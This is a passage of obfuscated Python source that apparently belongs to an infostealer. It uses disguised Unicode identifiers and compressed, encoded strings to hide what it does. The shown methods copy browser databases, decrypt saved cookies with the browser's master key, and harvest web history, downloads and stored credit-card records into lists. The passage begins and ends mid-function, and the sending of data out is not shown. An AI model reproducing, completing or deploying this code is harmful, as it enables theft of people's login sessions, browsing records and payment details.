        𝗰𝙤𝙣𝗻 = 𝘀𝙦𝗹𝙞𝘁𝘦3.connect(__𝙞𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
        𝘀𝙚𝙩𝘢𝘵𝘁𝘳(𝘤𝗼𝙣𝗻, 'text_factory', 𝗯𝙮𝘁𝗲𝘀)
        𝙘𝙪𝘳𝘀𝙤𝘳 = 𝗰𝘰𝘯𝘯.cursor()
        𝘤𝘶𝗿𝘀𝘰𝙧.execute(__𝙞𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝘳𝙤𝘄 in 𝘤𝙪𝙧𝘀𝘰𝗿.fetchall():
            if not 𝘳𝙤𝘸[𝗶𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 696 - (𝘪𝘯𝙩(𝙊) + 𝙞), 𝙢𝗮𝗽(__𝙞𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝘁𝘦𝙧(__𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝙚(0)), __𝗶𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝗼𝘄[𝗶𝗻𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 928 - (𝙞𝗻𝘁(𝘖) + 𝘪), 𝗺𝗮𝙥(__𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝘁𝙚𝙧(__𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0f\xf14\x06\x00\x03\x01\x01 ')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝗲(1)), __𝙞𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝙤𝙬[𝙞𝘯𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 958 - (𝘪𝗻𝘵(𝙊) + 𝘪), 𝗺𝗮𝗽(__𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘵𝘦𝗿(__𝘪𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0f\t5\x02\x00\x03\x18\x01+')).decode())] * 3)), 𝙧𝘢𝙣𝘨𝗲(1)), __𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]) or (not 𝘳𝘰𝘄[𝙞𝘯𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 386 - (𝗶𝘯𝘵(𝘖) + 𝗶), 𝗺𝘢𝙥(__𝗶𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝗶𝙩𝙚𝗿(__𝘪𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadJ\xaf\x02\x00\x03\xee\x01\xa9')).decode())] * 3)), 𝗿𝘢𝗻𝗴𝘦(1)), __𝙞𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝗰𝗼𝙤𝘬𝙞𝘦 = 𝙨𝘦𝙡𝘧.decrypt_password(𝗿𝙤𝘄[𝗶𝘯𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 614 - (𝗶𝙣𝘁(𝘖) + 𝙞), 𝘮𝘢𝗽(__𝙞𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝘪𝙩𝗲𝗿(__𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcbr\xad\x00\x00\x03|\x01v')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝘦(1)), __𝙞𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘀𝗲𝘭𝘧.master_key)
            𝘳𝗼𝘸 = [𝘹.decode(__𝘪𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKrw3H\x0c7)\xf1\r\xb4\xb5\x05\x00\x17\xe0\x03\x98')).decode()) if 𝗶𝙨𝙞𝘯𝘴𝙩𝙖𝗻𝘤𝗲(𝙭, 𝘣𝙮𝘁𝘦𝘀) else 𝙭 for 𝘹 in 𝘳𝙤𝘄]
            __𝗖𝗢𝘖𝗞𝙄𝗘𝙎__.append(𝘛𝘆𝗽𝗲𝙨.Cookie(𝗿𝙤𝘄[𝘪𝘯𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 915 - (𝘪𝙣𝘵(𝘖) + 𝗶), 𝗺𝗮𝘱(__𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝘪𝙩𝘦𝙧(__𝗶𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝙚(0)), __𝙞𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝙤𝘄[𝙞𝗻𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 307 - (𝗶𝙣𝙩(𝗢) + 𝙞), 𝘮𝙖𝘱(__𝙞𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝘪𝘵𝘦𝙧(__𝙞𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xadr4\x02\x00\x03Z\x01;')).decode())] * 3)), 𝘳𝘢𝙣𝗴𝘦(1)), __𝘪𝘮𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝙬[𝗶𝘯𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 314 - (𝙞𝘯𝘵(𝘖) + 𝗶), 𝙢𝗮𝙥(__𝙞𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝙚𝙧(__𝗶𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xadr\xad\x04\x00\x03\xa9\x01\x86')).decode())] * 3)), 𝘳𝙖𝙣𝙜𝙚(1)), __𝗶𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝗼𝘰𝘬𝘪𝙚, 𝙧𝘰𝘸[𝙞𝙣𝙩.from_bytes(𝗺𝘢𝘱(lambda O, i: 963 - (𝗶𝙣𝘁(𝘖) + 𝘪), 𝙢𝗮𝙥(__𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝗲𝗿(__𝗶𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\x0f\t5\x05\x00\x03\x1b\x01.')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝙚(1)), __𝘪𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝘂𝗿𝙨𝘰𝗿.close()
        𝘤𝗼𝙣𝘯.close()
        𝘰𝘀.remove(__𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())

    def get_web_history(self, path):
        𝙝𝙞𝙨𝘁𝙤𝗿𝙮_𝗱𝘣 = __𝗶𝘮𝙥𝙤𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝙥𝘢𝘵𝘩)
        if not 𝙤𝙨.path.exists(𝘩𝘪𝘴𝙩𝘰𝘳𝙮_𝗱𝙗):
            return
        𝘴𝘩𝘶𝘁𝙞𝙡.copy(𝘩𝙞𝘴𝘁𝙤𝗿𝘺_𝗱𝙗, __𝘪𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝘤𝙤𝘯𝗻 = 𝘴𝘲𝘭𝙞𝙩𝘦3.connect(__𝘪𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())
        𝘤𝘂𝙧𝘴𝗼𝙧 = 𝘤𝗼𝘯𝗻.cursor()
        𝙘𝘂𝘳𝘴𝗼𝗿.execute(__𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xabLr.OOq\xcf1Hr\x0f-\xf6t\xaf\xc8H6\x0eJK\xc9\xcd\xa9J\x8c\x00\xd2\xee9%Q\xc1N\xee\xa1\xd9\x96~`\xb5\x1e\xbe\xb6\x00q\xa2\x14\x90')).decode())
        for 𝙧𝙤𝘸 in 𝙘𝘶𝗿𝘴𝗼𝘳.fetchall():
            if not 𝙧𝙤𝘄[𝘪𝘯𝘁.from_bytes(𝘮𝘢𝗽(lambda O, i: 578 - (𝙞𝗻𝙩(𝘖) + 𝗶), 𝘮𝙖𝗽(__𝙞𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝙩𝘦𝗿(__𝘪𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝗮𝙣𝘨𝗲(0)), __𝗶𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝙬[𝙞𝘯𝙩.from_bytes(𝘮𝙖𝙥(lambda O, i: 809 - (𝘪𝘯𝘁(𝙊) + 𝘪), 𝗺𝙖𝗽(__𝘪𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝘱(*[𝙞𝘁𝘦𝘳(__𝗶𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3wq4\x01\x00\x02\xc2\x01\t')).decode())] * 3)), 𝗿𝙖𝘯𝗴𝙚(1)), __𝙞𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝘰𝙬[𝘪𝙣𝘁.from_bytes(𝗺𝗮𝘱(lambda O, i: 664 - (𝘪𝘯𝙩(𝙊) + 𝗶), 𝗺𝙖𝗽(__𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝙞𝙩𝙚𝗿(__𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xcb\x8a\xac\x04\x00\x03\xa5\x01\x8b')).decode())] * 3)), 𝘳𝗮𝙣𝙜𝘦(1)), __𝘪𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            __𝙒𝗘𝘉_𝙃𝙄𝗦𝘛𝗢𝗥𝘠__.append(𝙏𝙮𝗽𝙚𝘴.WebHistory(𝘳𝗼𝘸[𝗶𝙣𝘁.from_bytes(𝙢𝙖𝘱(lambda O, i: 794 - (𝗶𝙣𝘵(𝗢) + 𝗶), 𝙢𝗮𝙥(__𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝘵𝗲𝗿(__𝙞𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝗲(0)), __𝘪𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝗼𝘸[𝘪𝙣𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 351 - (𝗶𝗻𝘵(𝙊) + 𝗶), 𝗺𝙖𝘱(__𝙞𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝘁𝗲𝙧(__𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xad\n-\x07\x00\x03\xc7\x01\x94')).decode())] * 3)), 𝘳𝘢𝙣𝘨𝘦(1)), __𝗶𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘸[𝘪𝗻𝙩.from_bytes(𝗺𝙖𝗽(lambda O, i: 977 - (𝗶𝘯𝘵(𝘖) + 𝙞), 𝘮𝘢𝙥(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝗶𝘵𝙚𝗿(__𝘪𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\x0fI6\x04\x00\x033\x018')).decode())] * 3)), 𝘳𝙖𝗻𝗴𝘦(1)), __𝗶𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝘶𝗿𝙨𝗼𝗿.close()
        𝘤𝗼𝙣𝙣.close()
        𝗼𝙨.remove(__𝗶𝘮𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKt\xcf\xa9Jq\xb7\xacL\r\xb3\xcc\x8eL\xb7\xb5\x05\x000\xda\x05\x85')).decode())

    def get_downloads(self, path):
        𝘥𝘰𝘄𝗻𝘭𝗼𝙖𝘥𝘀_𝙙𝘣 = __𝘪𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK56L\x0ev\xcf\xa9Jq\xb7\xacL\r\xb4\xb5\x05\x00,\x87\x05:')).decode().format(𝙥𝙖𝘁𝘩)
        if not 𝙤𝙨.path.exists(𝗱𝙤𝙬𝘯𝙡𝙤𝙖𝗱𝙨_𝗱𝗯):
            return
        𝘀𝘩𝘂𝘵𝗶𝙡.copy(𝘥𝙤𝙬𝙣𝗹𝘰𝘢𝙙𝘀_𝙙𝗯, __𝘪𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝙘𝗼𝘯𝘯 = 𝘴𝙦𝘭𝘪𝘁𝘦3.connect(__𝗶𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())
        𝘤𝘂𝙧𝙨𝙤𝗿 = 𝘤𝙤𝘯𝘯.cursor()
        𝙘𝘂𝙧𝘀𝙤𝗿.execute(__𝙞𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5\xf4\x08\xca\x88\xcc\xb14L\xce-/\x06\xb1\x93sSrR\xdc,\xcb##\x82\xf2=]\xa3\x82C\x0c\x0c\xd2\xa3\xdc-\x8d\x93r+\xca"\xc3\x83\xaa\x00\x13\xf6\x12\xfa')).decode())
        for 𝙧𝙤𝙬 in 𝘤𝘶𝙧𝘴𝘰𝙧.fetchall():
            if not 𝙧𝙤𝙬[𝘪𝗻𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 405 - (𝘪𝗻𝘁(𝘖) + 𝙞), 𝗺𝘢𝗽(__𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝗶𝘁𝘦𝙧(__𝘪𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝘪𝗺𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝘳𝗼𝘄[𝗶𝗻𝘵.from_bytes(𝗺𝗮𝘱(lambda O, i: 291 - (𝘪𝗻𝘁(𝘖) + 𝙞), 𝙢𝙖𝘱(__𝗶𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝘁𝘦𝙧(__𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcd\xca.\x07\x00\x03\xc3\x01\x9a')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝘦(1)), __𝙞𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]:
                continue
            __𝗗𝙊𝘞𝘕𝗟𝙊𝘼𝗗𝘚__.append(𝘛𝙮𝘱𝘦𝘴.Download(𝙧𝘰𝘸[𝙞𝙣𝘁.from_bytes(𝘮𝙖𝘱(lambda O, i: 813 - (𝘪𝘯𝘵(𝘖) + 𝗶), 𝗺𝙖𝘱(__𝗶𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝘁𝙚𝘳(__𝗶𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝗻𝗴𝗲(0)), __𝙞𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝗼𝙬[𝗶𝘯𝘁.from_bytes(𝗺𝙖𝙥(lambda O, i: 967 - (𝙞𝙣𝙩(𝗢) + 𝘪), 𝙢𝗮𝗽(__𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝘁𝗲𝘳(__𝘪𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\x0f\x894\x02\x00\x03 \x01/')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝙚(1)), __𝘪𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝙘𝘶𝗿𝘴𝘰𝗿.close()
        𝙘𝘰𝗻𝗻.close()
        𝙤𝘴.remove(__𝘪𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8br\xb74N\xca\xad(\x8b\x0c\x0f\xaa\x8a0\n\xca\x04\x00.%\x05\x8c')).decode())

    def get_credit_cards(self, path):
        𝘤𝘢𝙧𝘥𝘴_𝗱𝘣 = __𝗶𝘮𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK56L\x0e3\n\xcb\xf4t\r\xcaHqw\xb5\x05\x00)\x98\x04\xe9')).decode().format(𝗽𝗮𝘁𝘩)
        if not 𝗼𝙨.path.exists(𝘤𝙖𝘳𝘥𝘴_𝘥𝗯):
            return
        𝘴𝙝𝘶𝘵𝗶𝙡.copy(𝙘𝘢𝘳𝙙𝙨_𝘥𝙗, __𝙞𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝘤𝗼𝘯𝗻 = 𝘴𝘲𝘭𝘪𝘵𝙚3.connect(__𝗶𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())
        𝗰𝘂𝗿𝙨𝗼𝙧 = 𝙘𝘰𝙣𝘯.cursor()
        𝙘𝘂𝙧𝙨𝘰𝗿.execute(__𝗶𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdae\x8dA\x0b\xc2 \x18\x86\xff\x92\t\x1e<t\xd9`6i\xa3,\xf5\x9b7]\xdbd~\x83\xa0h\xf8\xef\x13:v}\xde\x87\xf7\xd1\xc4tJ\xf7\xba\x15,\x06k\xe6@\xd9<\xd0&\xbbz_\x1c\xc4\xdd\x83\x8c\x0f\x81\x9f\x80\xfc]6\xe2\xff9s\xb6\xc9\xe7\xbaZ\x07\x90\t(;\x04+qD\x8ea\xeb\xf3\x04\x15q\xf6\xfaj\x85*~\xf9\xb7<y\xeb\x9e\x85-\n\xe5\xe5~\xab\xd6q3\xc9\x83\xfauO\xdd\xf1\x0b\xa1_2\x87')).decode())
        for 𝙧𝘰𝘄 in 𝘤𝘶𝗿𝘴𝘰𝙧.fetchall():
